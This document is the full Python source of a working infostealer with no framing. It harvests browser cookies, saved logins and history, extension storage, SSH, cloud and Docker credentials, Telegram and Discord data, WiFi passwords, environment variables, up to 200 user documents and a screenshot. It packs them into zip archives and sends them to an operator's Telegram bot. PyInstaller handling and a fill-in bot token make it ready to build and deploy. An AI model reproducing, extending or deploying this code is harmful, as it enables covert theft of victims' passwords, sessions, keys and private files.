import os
import requests
import time
import subprocess
import sys
import tempfile
import zipfile
import io
import json
import shutil
from pathlib import Path

# Handle frozen/PyInstaller execution
if getattr(sys, 'frozen', False):
    BASE_DIR = Path(os.path.dirname(sys.executable))
    tempfile.tempdir = str(BASE_DIR / "temp")
    os.makedirs(tempfile.tempdir, exist_ok=True)
else:
    BASE_DIR = Path(os.path.dirname(os.path.abspath(__file__)))

def get_system_info():
    info = {}
    if os.name == "nt":
        info["hostname"] = os.environ.get("COMPUTERNAME", "Unknown")
        info["username"] = os.environ.get("USERNAME", "Unknown")
        info["os"] = "Windows"
        info["drive"] = "C:\\"
    elif sys.platform == "darwin":
        try:
            info["hostname"] = subprocess.check_output(["hostname"], stderr=subprocess.DEVNULL).decode().strip()
        except:
            info["hostname"] = "Unknown"
        info["username"] = os.environ.get("USER", "Unknown")
        info["os"] = "macOS"
        info["drive"] = "/"
    else:
        try:
            info["hostname"] = subprocess.check_output(["hostname"], stderr=subprocess.DEVNULL).decode().strip()
        except:
            info["hostname"] = "Unknown"
        info["username"] = os.environ.get("USER", "Unknown")
        info["os"] = "Linux"
        info["drive"] = "/"
    return info

def safe_copy(src, dst):
    try:
        if os.path.isfile(src) and os.access(src, os.R_OK):
            shutil.copy2(src, dst)
            return True
    except Exception:
        pass
    return False

def get_browser_profiles():
    profiles = []
    home = Path.home()
    
    if os.name == "nt":
        appdata = Path(os.environ.get("LOCALAPPDATA", ""))
        appdata_roaming = Path(os.environ.get("APPDATA", ""))
        
        chrome_browsers = {
            "Chrome": appdata / "Google" / "Chrome" / "User Data",
            "Chromium": appdata / "Chromium" / "User Data",
            "Edge": appdata / "Microsoft" / "Edge" / "User Data",
            "Brave": appdata / "BraveSoftware" / "Brave-Browser" / "User Data",
            "Opera": appdata_roaming / "Opera Software" / "Opera Stable",
            "Vivaldi": appdata / "Vivaldi" / "User Data",
        }
        
        for name, path in chrome_browsers.items():
            if path.exists():
                for item in path.iterdir():
                    if item.is_dir() and (item.name == "Default" or item.name.startswith("Profile ")):
                        profiles.append((name, item))
        
        firefox_paths = [
            appdata_roaming / "Mozilla" / "Firefox" / "Profiles",
            Path(os.environ.get("PROGRAMFILES", "C:\\Program Files")) / "Mozilla Firefox" / "Profiles",
        ]
        for fp in firefox_paths:
            if fp.exists():
                for profile_dir in fp.iterdir():
                    if profile_dir.is_dir():
                        profiles.append(("Firefox", profile_dir))
    else:
        config = Path.home() / ".config"
        appdata = Path.home() / "Library" / "Application Support" if sys.platform == "darwin" else None
        
        chrome_browsers = {
            "Chrome": (config / "google-chrome") if not appdata else (appdata / "Google" / "Chrome"),
            "Chromium": (config / "chromium") if not appdata else (appdata / "Chromium"),
            "Brave": (config / "BraveSoftware" / "Brave-Browser") if not appdata else (appdata / "BraveSoftware" / "Brave-Browser"),
            "Edge": (config / "microsoft-edge") if not appdata else (appdata / "Microsoft" / "Edge"),
        }
        
        for name, base_path in chrome_browsers.items():
            if base_path and base_path.exists():
                user_data = base_path / "User Data" if (base_path / "User Data").exists() else base_path
                if not (base_path / "User Data").exists():
                    user_data = base_path
                if user_data.exists():
                    for item in user_data.iterdir():
                        if item.is_dir() and (item.name == "Default" or item.name.startswith("Profile ")):
                            profiles.append((name, item))

        firefox_paths = [
            Path.home() / ".mozilla" / "firefox",
            Path.home() / "snap" / "firefox" / "common" / ".mozilla" / "firefox",
        ]
        if sys.platform == "darwin":
            firefox_paths.append(Path.home() / "Library" / "Application Support" / "Firefox" / "Profiles")
        for fp in firefox_paths:
            if fp and fp.exists():
                for profile_dir in fp.iterdir():
                    if profile_dir.is_dir():
                        profiles.append(("Firefox", profile_dir))
    
    return profiles

def collect_browser_data(browser_name, profile_path, temp_dir):
    browser_dir = temp_dir / "Browsers" / browser_name / profile_path.name
    browser_dir.mkdir(parents=True, exist_ok=True)
    
    target_files = [
        "Cookies", "Cookies.db",
        "Login Data", "Login Data.db",
        "History", "History.db",
        "Bookmarks", "Bookmarks.bak",
        "Web Data", "Web Data.db",
        "Network/Cookies", "Network/Cookies.db",
        "Local State",
        "cookies.sqlite", "places.sqlite",
        "logins.json", "key4.db",
        "signons.sqlite", "formhistory.sqlite",
        "permissions.sqlite",
        "sessionstore.jsonlz4",
        "containers.json",
    ]
    
    copied = 0
    for rel_path in target_files:
        src = profile_path / rel_path
        dst = browser_dir / rel_path.replace("/", "_")
        if safe_copy(src, dst):
            copied += 1
    
    return copied

def collect_browser_extensions_data(browser_name, profile_path, temp_dir):
    ext_dir = temp_dir / "Browsers" / browser_name / profile_path.name / "Extensions"
    ext_dir.mkdir(parents=True, exist_ok=True)
    
    for ext_path in [profile_path / "Local Extension Settings", profile_path / "Sync Extension Settings"]:
        if ext_path.exists():
            try:
                for ext_folder in ext_path.iterdir():
                    if ext_folder.is_dir():
                        dst = ext_dir / ext_folder.name
                        dst.mkdir(parents=True, exist_ok=True)
                        for f in ext_folder.iterdir():
                            if f.is_file() and f.stat().st_size < 5*1024*1024:
                                safe_copy(f, dst / f.name)
            except:
                pass

def collect_documents(temp_dir):
    doc_dir = temp_dir / "Documents"
    doc_dir.mkdir(parents=True, exist_ok=True)
    
    home = Path.home()
    doc_extensions = {'.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.rtf', '.odt', '.ods', '.odp', '.csv', '.txt', '.md'}
    
    search_paths = [home / "Documents", home / "Desktop", home / "Downloads"]
    if os.name == "nt":
        search_paths.append(Path(os.environ.get("PUBLIC", "C:\\Users\\Public")) / "Documents")
    
    count = 0
    for sp in search_paths:
        if sp and sp.exists():
            try:
                for root, dirs, files in os.walk(str(sp)):
                    if count >= 200:
                        break
                    dirs[:] = [d for d in dirs if not d.startswith('.') and d not in ['node_modules', '__pycache__', '.git']]
                    for file in files:
                        if count >= 200:
                            break
                        ext = Path(file).suffix.lower()
                        if ext not in doc_extensions:
                            continue
                        src = Path(root) / file
                        try:
                            if src.stat().st_size < 20*1024*1024 and src.stat().st_size > 0:
                                shutil.copy2(str(src), str(doc_dir / f"{count}_{file}"))
                                count += 1
                        except:
                            pass
            except:
                pass

def collect_credentials(temp_dir):
    cred_dir = temp_dir / "Credentials"
    cred_dir.mkdir(parents=True, exist_ok=True)
    
    home = Path.home()
    
    if os.name == "nt":
        cred_patterns = [
            home / ".ssh",
            Path(os.environ.get("APPDATA", "")) / ".ssh",
            home / ".aws",
            home / ".azure",
            home / ".kube",
            home / ".docker",
            home / ".config" / "gcloud",
            home / ".npmrc",
            home / ".netrc",
            home / ".pgpass",
            home / ".my.cnf",
            Path(os.environ.get("APPDATA", "")) / "Subversion",
            Path(os.environ.get("APPDATA", "")) / "FileZilla",
            Path(os.environ.get("APPDATA", "")) / "WinSCP",
            Path(os.environ.get("APPDATA", "")) / "putty",
            Path(os.environ.get("APPDATA", "")) / "discord",
            Path(os.environ.get("APPDATA", "")) / "Telegram Desktop" / "tdata",
            Path(os.environ.get("LOCALAPPDATA", "")) / "Microsoft" / "Credentials",
        ]
    else:
        cred_patterns = [
            home / ".ssh",
            home / ".aws",
            home / ".azure",
            home / ".kube",
            home / ".docker",
            home / ".config" / "gcloud",
            home / ".config" / "gh",
            home / ".npmrc",
            home / ".netrc",
            home / ".pgpass",
            home / ".my.cnf",
            home / ".gnupg",
            home / ".config" / "discord",
            home / ".config" / "filezilla",
            "/etc/ssh",
            "/root/.ssh",
        ]
    
    for pattern in cred_patterns:
        p = Path(pattern) if not isinstance(pattern, Path) else pattern
        if p.exists():
            try:
                if p.is_dir():
                    for item in p.rglob("*"):
                        if item.is_file() and item.stat().st_size < 10*1024*1024:
                            rel_name = str(item.relative_to(p.parent if p != p.parent else p)).replace("/", "_").replace("\\", "_")
                            safe_copy(item, cred_dir / rel_name)
                else:
                    safe_copy(p, cred_dir / p.name)
            except:
                pass

def collect_wifi_passwords(temp_dir):
    if os.name != "nt":
        return
    wifi_dir = temp_dir / "WiFi"
    wifi_dir.mkdir(parents=True, exist_ok=True)
    try:
        result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, timeout=15)
        profiles = [line.split(":")[1].strip() for line in result.stdout.split("\n") if "All User Profile" in line]
        wifi_data = []
        for profile in profiles[:50]:
            try:
                r = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"], capture_output=True, text=True, timeout=10)
                wifi_data.append(r.stdout)
            except:
                pass
        if wifi_data:
            with open(wifi_dir / "wifi_passwords.txt", "w", encoding="utf-8") as f:
                f.write("\n\n".join(wifi_data))
    except:
        pass

def collect_screenshot(temp_dir):
    try:
        if sys.platform == "darwin":
            subprocess.run(["screencapture", "-x", str(temp_dir / "screenshot.png")], timeout=10)
        elif os.name != "nt":
            subprocess.run(["import", "-window", "root", str(temp_dir / "screenshot.png")], timeout=10)
    except:
        pass

def collect_system_info_file(temp_dir, info):
    sys_dir = temp_dir / "System_Info"
    sys_dir.mkdir(parents=True, exist_ok=True)
    
    with open(sys_dir / "system_info.txt", "w") as f:
        f.write(f"Hostname: {info['hostname']}\n")
        f.write(f"Username: {info['username']}\n")
        f.write(f"OS: {info['os']}\n")
        f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
    
    try:
        if os.name == "nt":
            result = subprocess.run(["ipconfig", "/all"], capture_output=True, text=True, timeout=15)
        else:
            result = subprocess.run(["ifconfig"], capture_output=True, text=True, timeout=15)
        with open(sys_dir / "network_info.txt", "w") as f:
            f.write(result.stdout)
    except:
        pass
    
    try:
        if os.name == "nt":
            result = subprocess.run(["tasklist"], capture_output=True, text=True, timeout=10)
        else:
            result = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=10)
        with open(sys_dir / "processes.txt", "w") as f:
            f.write(result.stdout)
    except:
        pass
    
    with open(sys_dir / "environment.txt", "w") as f:
        for key, value in sorted(os.environ.items()):
            f.write(f"{key}={value}\n")

def send_message(bot_token, chat_id, text):
    try:
        requests.get(
            f"https://api.telegram.org/bot{bot_token}/sendMessage",
            params={"chat_id": chat_id, "text": text},
            timeout=10
        )
    except:
        pass

def create_and_send_zip(bot_token, chat_id, source_dir, zip_name, max_size_mb=45):
    """Create a zip file on disk and send it. Returns number of files added."""
    zip_path = Path(tempfile.tempdir) / zip_name
    files_added = 0
    
    try:
        with zipfile.ZipFile(str(zip_path), 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, _, files in os.walk(str(source_dir)):
                for file in files:
                    fp = Path(root) / file
                    try:
                        file_size = fp.stat().st_size
                        if file_size == 0:
                            continue
                        if file_size > max_size_mb * 1024 * 1024:
                            continue
                        
                        # Make relative path within zip
                        rel_path = str(fp.relative_to(source_dir))
                        
                        content = fp.read_bytes()
                        zf.writestr(rel_path, content)
                        files_added += 1
                    except Exception:
                        continue
        
        # Verify zip has content
        if files_added > 0 and zip_path.stat().st_size > 0:
            # Send the zip file
            with open(str(zip_path), "rb") as f:
                response = requests.post(
                    f"https://api.telegram.org/bot{bot_token}/sendDocument",
                    data={"chat_id": chat_id},
                    files={"document": (zip_name, f, "application/zip")},
                    timeout=300  # 5 minute timeout for large files
                )
            
            if response.status_code == 200:
                send_message(bot_token, chat_id, f"[+] Sent: {zip_name} ({files_added} files, {zip_path.stat().st_size//1024}KB)")
            else:
                send_message(bot_token, chat_id, f"[!] Failed to send {zip_name}: {response.status_code}")
        
        # Clean up
        try:
            zip_path.unlink()
        except:
            pass
        
    except Exception as e:
        send_message(bot_token, chat_id, f"[!] Error creating {zip_name}: {str(e)[:50]}")
        try:
            zip_path.unlink()
        except:
            pass
    
    return files_added

def main():
    # ============================================================
    # >>> CONFIGURE THESE TWO VALUES <<<
    # ============================================================
    BOT_TOKEN = "YOUR_BOT_TOKEN"
    CHAT_ID = "YOUR_CHAT_ID_HERE"  # <-- REPLACE with your actual chat ID
    # ============================================================
    
    info = get_system_info()
    device_name = f"{info['os']}_{info['hostname']}"
    
    # Auto-get chat ID if not configured
    if CHAT_ID == "YOUR_CHAT_ID_HERE":
        try:
            response = requests.get(
                f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates",
                timeout=15
            )
            updates = response.json()
            if updates.get("ok") and updates.get("result"):
                CHAT_ID = updates["result"][0]["message"]["chat"]["id"]
            else:
                sys.exit(1)
        except:
            sys.exit(1)
    
    send_message(BOT_TOKEN, CHAT_ID, f"[+] Extraction started on {device_name}")
    
    # Create a physical directory on disk for all collected data
    work_dir = Path(tempfile.tempdir) / f"extract_{int(time.time())}"
    work_dir.mkdir(parents=True, exist_ok=True)
    
    try:
        # 1. System info
        send_message(BOT_TOKEN, CHAT_ID, "[*] Collecting system info...")
        collect_system_info_file(work_dir, info)
        
        # 2. WiFi passwords
        send_message(BOT_TOKEN, CHAT_ID, "[*] Collecting WiFi passwords...")
        collect_wifi_passwords(work_dir)
        
        # 3. Browser data
        send_message(BOT_TOKEN, CHAT_ID, "[*] Collecting browser data...")
        browser_profiles = get_browser_profiles()
        for browser_name, profile_path in browser_profiles:
            collect_browser_data(browser_name, profile_path, work_dir)
            collect_browser_extensions_data(browser_name, profile_path, work_dir)
        
        # 4. Credentials
        send_message(BOT_TOKEN, CHAT_ID, "[*] Collecting credentials...")
        collect_credentials(work_dir)
        
        # 5. Documents
        send_message(BOT_TOKEN, CHAT_ID, "[*] Collecting documents...")
        collect_documents(work_dir)
        
        # 6. Screenshot
        collect_screenshot(work_dir)
        
        # 7. List all collected files
        all_files = []
        for root, _, files in os.walk(str(work_dir)):
            for f in files:
                fp = Path(root) / f
                all_files.append((fp, fp.stat().st_size))
        
        all_files.sort(key=lambda x: x[1], reverse=True)
        
        total_size = sum(s for _, s in all_files)
        send_message(BOT_TOKEN, CHAT_ID, f"[*] Collected {len(all_files)} files ({total_size//1024}KB total)")
        
        if not all_files:
            send_message(BOT_TOKEN, CHAT_ID, "[-] No files were collected")
            return
        
        # 8. Send inventory first
        inventory = f"=== File Inventory - {device_name} ===\n"
        inventory += f"Total files: {len(all_files)}\n"
        inventory += f"Total size: {total_size//1024}KB\n\n"
        
        for fp, size in all_files[:200]:  # First 200 files
            try:
                rel = str(fp.relative_to(work_dir))
            except:
                rel = fp.name
            size_str = f"{size/1024:.1f}KB" if size < 1024*1024 else f"{size/(1024*1024):.1f}MB"
            inventory += f"[{size_str}] {rel}\n"
        
        inventory += f"\n... and {max(0, len(all_files)-200)} more files"
        
        # Write inventory to file and send it
        inv_path = work_dir / "_inventory.txt"
        with open(str(inv_path), "w", encoding="utf-8") as f:
            f.write(inventory)
        
        with open(str(inv_path), "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                data={"chat_id": CHAT_ID},
                files={"document": (f"Inventory_{device_name.replace(' ','_')}.txt", f, "text/plain")},
                timeout=30
            )
        
        # 9. Create and send zip packages in chunks
        send_message(BOT_TOKEN, CHAT_ID, f"[*] Creating zip packages...")
        
        # Get all files sorted by size (smallest first for better compression)
        file_list = [(fp, fp.stat().st_size) for fp, _ in all_files]
        file_list.sort(key=lambda x: x[1])
        
        # Group into chunks of ~45MB
        MAX_ZIP_SIZE = 45 * 1024 * 1024
        chunks = []
        current_chunk = []
        current_size = 0
        
        for fp, size in file_list:
            if current_size + size > MAX_ZIP_SIZE and current_chunk:
                chunks.append(current_chunk)
                current_chunk = []
                current_size = 0
            current_chunk.append((fp, size))
            current_size += size
        
        if current_chunk:
            chunks.append(current_chunk)
        
        total_chunks = len(chunks)
        send_message(BOT_TOKEN, CHAT_ID, f"[*] Creating {total_chunks} package(s)...")
        
        for i, chunk in enumerate(chunks, 1):
            # Create a temp directory for this chunk
            chunk_dir = Path(tempfile.tempdir) / f"chunk_{i}"
            chunk_dir.mkdir(parents=True, exist_ok=True)
            
            # Copy files to chunk directory
            files_in_chunk = 0
            for fp, size in chunk:
                try:
                    rel = str(fp.relative_to(work_dir))
                    dst = chunk_dir / rel
                    dst.parent.mkdir(parents=True, exist_ok=True)
                    shutil.copy2(str(fp), str(dst))
                    files_in_chunk += 1
                except:
                    pass
            
            if files_in_chunk > 0:
                zip_name = f"Data_{device_name.replace(' ','_')}_part{i}of{total_chunks}.zip"
                create_and_send_zip(BOT_TOKEN, CHAT_ID, chunk_dir, zip_name)
                time.sleep(2)
            
            # Clean up chunk directory
            try:
                shutil.rmtree(str(chunk_dir))
            except:
                pass
        
        send_message(BOT_TOKEN, CHAT_ID, f"[+] COMPLETE! {len(all_files)} files sent in {total_chunks} packages")
    
    except Exception as e:
        send_message(BOT_TOKEN, CHAT_ID, f"[!] Error: {str(e)[:200]}")
    
    finally:
        # Clean up
        try:
            shutil.rmtree(str(work_dir))
        except:
            pass

if __name__ == "__main__":
    if getattr(sys, 'frozen', False):
        try:
            os.getcwd()
        except:
            os.chdir(os.path.dirname(sys.executable))
    
    main()
